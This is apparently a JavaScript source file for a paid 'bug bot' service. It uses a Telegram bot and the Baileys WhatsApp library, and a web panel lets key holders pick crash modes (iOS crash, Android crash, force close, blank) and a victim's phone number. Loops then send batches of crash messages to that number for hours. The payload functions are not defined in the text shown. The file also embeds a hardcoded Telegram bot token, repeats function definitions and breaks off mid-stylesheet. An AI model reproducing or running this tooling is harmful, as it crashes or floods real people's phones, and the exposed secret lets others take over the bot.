const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent
} = require('@whiskeysockets/baileys');

const BOT_TOKEN = "8352772539:AAHgaQBB0nRU2x5Fv6fZlF-aZwffJSI1GJc";
const OWNER_ID = "1309102882";
const bot = new Telegraf(BOT_TOKEN);
const { domain, port } = require("./database/config");
const app = express();

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const cooldowns = {};
let DEFAULT_COOLDOWN_MS = 5 * 60 * 1000;
let userApiBug = null;
let sock;

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id);
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
}

function saveUsers(users) {
  const filePath = path.join(__dirname, 'database', 'user.json');
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
    console.log("✅ Data user berhasil disimpan.");
  } catch (err) {
    console.error("❌ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf-8'));
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

function parseDuration(str) {
  if (!str || typeof str !== "string") return null;
  
  const match = str.match(/^(\d+)(s|m|h|d)$/i);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value * 1000; // detik → ms
    case "m": return value * 60 * 1000; // menit → ms
    case "h": return value * 60 * 60 * 1000; // jam → ms
    case "d": return value * 24 * 60 * 60 * 1000; // hari → ms
    default: return null;
  }
}

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    fs.writeFileSync(file_session, JSON.stringify([...list, BotNumber]));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const makeStatus = (number, status) => `\`\`\`
╭━━━[ BOT VOLTAGE APPS ]━━━⬣
┃  Nomor : ${number}
┃  Status : ${status.toUpperCase()}
╰━━━━━━━━━━━━━━━━━━━━━━⬣
\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
╭━━━[ BOT VOLTAGE APPS ]━━━⬣
┃  Nomor : ${number}
┃  Code Pairing : ${code}
╰━━━━━━━━━━━━━━━━━━━━━━⬣
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "! Copy", callback_data: `salin|${code}` }]
    ]
  }
});

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  
  console.log(chalk.blue(`
╭━━━[ BOT VOLTAGE APPS ]━━━⬣
┃  Jumlah : ${activeNumbers.length}
╰━━━━━━━━━━━━━━━━━━━━━━⬣
`));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return shouldReconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "1234BAIL");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, 
            makeCode(BotNumber, formatted).text, {
              parse_mode: "Markdown",
              reply_markup: makeCode(BotNumber, formatted).reply_markup
            });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

bot.command("start", (ctx) => {
  const teks = `( 弟 ) – Hi! || I'm Bot Apps Api, a Telegram bot built by Dilxz using JavaScript technology. I was made to assist you, so use me wisely

 ( 𖥊 ) Sender Menu ⸸
 ▢ /addsender
 ▢ /delsender
 ▢ /listsender
 
 ( 𖥊 ) Key Menu ⸸
 ▢ /addkey
 ▢ /delkey
 ▢ /listkey

 ( 𖥊 ) Acces Menu ⸸
 ▢ /addacces
 ▢ /delacces
 ▢ /listacces
 ▢ /addowner
 ▢ /delowner
 ▢ /listowner
 ▢ /cooldown`;
  ctx.replyWithMarkdown(teks);
});

bot.command("addsender", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }

  if (args.length < 2) {
    return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addsender Number_\n_Example : /addsender 628xxxx_", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("delsender", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (args.length < 2) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delsender Number_\n_Example : /delsender 628xxxx_", { parse_mode: "Markdown" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    fs.writeFileSync(file_session, JSON.stringify(data.filter(n => n !== number)));
    ctx.reply(`✅ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

bot.command("listsender", (ctx) => {
  const userId = ctx.from.id.toString();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  ctx.reply(`*Daftar Sender Aktif:*\n${[...sessions.keys()].map(n => `• ${n}`).join("\n")}`, 
    { parse_mode: "Markdown" });
});

bot.command("addkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (!args || !args.includes(",")) {
    return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addkey User,Day\n_Example : /addkey user,30d", { parse_mode: "Markdown" });
  }

  const [username, durasiStr] = args.split(",");
  const durationMs = parseDuration(durasiStr.trim());
  if (!durationMs) return ctx.reply("❌ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  ctx.replyWithMarkdown(`✅ *Key berhasil dibuat:*\n\n*Username:* \`${username}\`\n*Key:* \`${key}\`\n*Expired:* _${expiredStr}_ WIB\n\n*Note:*\n- \n- No sebar ALL\n- No jual lagi`);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ! ] - ONLY ACCES USER\n—Please register first to access this feature.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey user");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`❌ Username \`${username}\` not found.`, { parse_mode: "Markdown" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✅ Key belonging to *${username}* was successfully deleted.`, { parse_mode: "Markdown" });
});

bot.command("listkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🕸️ *Active Key List:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addacces Id_\n_Example : /addacces 12345678_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✅ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delacces Id_\n_Example : /delacces 12345678_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✅ Access to user ID ${id} removed.`);
});

bot.command("listacces", (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }

  const data = loadAkses();

  if (!data.akses || data.akses.length === 0) {
    return ctx.reply("📂 *Access List Empty.*\n\n_No user has access yet._", { parse_mode: "Markdown" });
  }

  let list = data.akses
    .map((id, index) => `${index + 1}. \`${id}\``)
    .join("\n");

  ctx.reply(
    `📂 *Access List (${data.akses.length} users)*\n\n${list}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /addowner Id_\n_Example : /addowner 12345678_", { parse_mode: "Markdown" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("❌ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✅ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }
  if (!id) return ctx.reply("❌ *Syntax Error!*\n\n_Use : /delowner Id_\n_Example : /delowner 12345678_", { parse_mode: "Markdown" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("❌ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✅ Owner ID ${id} was successfully deleted.`);
});

bot.command("listowner", (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isOwner(userId)) {
    return ctx.reply("[ ! ] - ONLY OWNER USER\n—Please register first to access this feature.");
  }

  const data = loadAkses();

  if (!data.owners || data.owners.length === 0) {
    return ctx.reply("👑 *Owner List Empty.*\n\n_No owner registered yet._", { parse_mode: "Markdown" });
  }

  let list = data.owners
    .map((id, index) => `${index + 1}. \`${id}\``)
    .join("\n");

  ctx.reply(
    `👑 *Owner List (${data.owners.length} users)*\n\n${list}`,
    { parse_mode: "Markdown" }
  );
});

bot.command("cooldown", async (ctx) => {
  const input = ctx.message.text.split(" ")[1]; 
  const ms = parseDuration(input);

  if (!ms) {
    return ctx.reply("❌ Format salah!\nContoh yang benar:\n- 30s (30 detik)\n- 5m (5 menit)\n- 1h (1 jam)\n- 1d (1 hari)");
  }

  globalThis.DEFAULT_COOLDOWN_MS = ms;
  DEFAULT_COOLDOWN_MS = ms;

  ctx.reply(`✅ Jeda berhasil diubah jadi *${input}* (${ms / 1000} detik)`);
});

console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀`));

bot.launch();
console.log(chalk.red(`╭─☐   BOT VOLTAGE APPS
├─ ID Owner : ${OWNER_ID}
├─ Creatoe : @dilxzcode
├─ Support : My Partner
├─ Status : Connected ✅
╰───────────────────`));

initializeWhatsAppConnections();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "HCS-View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/execution");
});

app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  const msg = req.query.msg || "";
  const filePath = "./HCS-View/Login.html";

  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");

    if (!username) return res.send(html);

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      return res.send(html);
    }

    const targetNumber = req.query.target;
    const mode = req.query.mode;
    const target = `${targetNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
        message: "Tunggu sampai maintenance selesai..."
      }, false, currentUser, "", mode));
    }

    if (!targetNumber) {
      if (!mode) {
        return res.send(executionPage("✅ Server ON", {
          message: "Pilih mode yang ingin digunakan."
        }, true, currentUser, "", ""));
      }

      if (["BugForce", "BugCrashIos", "BugInvisible", "BugBlank", "BugCrashAndro"].includes(mode)) {
        return res.send(executionPage("✅ Server ON", {
          message: "Masukkan nomor target."
        }, true, currentUser, "", mode));
      }

      return res.send(executionPage("❌ Mode Salah", {
        message: "Mode tersebut tidak dikenali."
      }, false, currentUser, "", ""));
    }

    if (!/^\d+$/.test(targetNumber)) {
      return res.send(executionPage("❌ Format Salah", {
        target: targetNumber,
        message: "Nomor harus diawali dengan nomor negara"
      }, true, currentUser, "", mode));
    }

    try {
      if (mode === "BugForce") {
        FunctionForce(24, target);
      } else if (mode === "BugCrashIos") {
        FunctionCrashIos(24, target);
      } else if (mode === "BugCrashAndro") {
        FunctionCrashAndro(24, target);
      } else if (mode === "BugInvisible") {
        FunctionInvisible(24, target);
      } else if (mode === "BugBlank") {
        FunctionBlank(24, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      return res.send(executionPage("✅ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `Execute Mode : ${mode.toUpperCase()}`
      }, false, currentUser, "", mode));
    } catch (err) {
      return res.send(executionPage("❌ Gagal kirim", {
        target: targetNumber,
        message: err.message || "Terjadi kesalahan saat pengiriman."
      }, false, currentUser, "Gagal mengeksekusi nomor.", mode));
    }
  });
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(port, () => {
  console.log(`🚀 Server aktif di ${domain}:${port}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

async function GetsuzoBatch(X, BotNumber) {
    const sock = await ensureConnection(BotNumber);
    console.log(chalk.yellow(`🚀 Mulai batch bug ke target : ${X}`));

    const duration = 30 * 60 * 1000;
    const start = Date.now();

    while (Date.now() - start < duration) {
        await Promise.all([
            example(sock, X),
        ]);
        console.log(chalk.blue(`⏳ Crash batch selesai, lanjut batch berikutnya...`));
        await sleep(2000);
    }

    console.log(chalk.green(`✅ Selesai 30 menit bug ke target : ${X}`));
}

async function FunctionInvisible(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 25) {
        await Promise.all([          
          saturninvis(X, true)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│   ${count + 1}/25 Voltage Crash
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Voltage Apps | 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error: ${error.message}`);
      setTimeout(sendNext, 2000);
    }
  };
  sendNext();
}

async function FunctionForce(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 25) {
        await Promise.all([
          forcelock(X),
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│   ${count + 1}/25 Voltage Crash
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Voltage Apps | 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error: ${error.message}`);
      setTimeout(sendNext, 2000);
    }
  };
  sendNext();
}

async function FunctionCrashIos(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 25) {
        await Promise.all([
          iosclose(sock, X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│   ${count + 1}/25 Voltage Crash
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Voltage Apps | 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error: ${error.message}`);
      setTimeout(sendNext, 2000);
    }
  };
  sendNext();
}

async function FunctionCrashAndro(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 25) {
        await Promise.all([
          starscrash(X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│   ${count + 1}/25 Voltage Crash
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Voltage Apps | 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error: ${error.message}`);
      setTimeout(sendNext, 2000);
    }
  };
  sendNext();
}

async function FunctionBlank(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 25) {
        await Promise.all([
          newxblank(X), 
          groupblank(X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│   ${count + 1}/25 Voltage Crash
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Voltage Apps | 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error: ${error.message}`);
      setTimeout(sendNext, 2000);
    }
  };
  sendNext();
}

const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Website Execution</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Orbitron', sans-serif;
      background: linear-gradient(135deg, #000000, #330000, #7f0000);
      background-size: 400% 400%;
      animation: bgAnimation 20s ease infinite;
      color: #ff0000;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    @keyframes bgAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .container {
      background: rgba(0, 0, 0, 0.7);
      border: 1px solid #ff0000;
      padding: 28px;
      border-radius: 20px;
      max-width: 420px;
      width: 100%;
      box-shadow: 0 0 25px rgba(255, 0, 0, 0.7);
      backdrop-filter: blur(12px);
      position: relative;
    }
    .logo {
      width: 90px;
      height: 90px;
      margin: 0 auto 14px;
      display: block;
      border-radius: 50%;
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.9);
      object-fit: cover;
    }
    .username {
      font-size: 22px;
      color: #ff0000;
      font-weight: bold;
      text-align: center;
      margin-bottom: 6px;
      text-shadow: 0 0 6px rgba(255,0,0,0.7);
    }
    .connected {
      font-size: 14px;
      margin-bottom: 18px;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #00ff5e;
      text-shadow: 0 0 6px rgba(0,255,94,0.7);
      font-weight: bold;
    }
    .connected::before {
      content: '';
      width: 10px;
      height: 10px;
      background: #00ff5e;
      border-radius: 50%;
      display: inline-block;
      margin-right: 8px;
      box-shadow: 0 0 6px rgba(0,255,94,0.9);
    }
    input[type="text"], select {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      background: #1a0000;
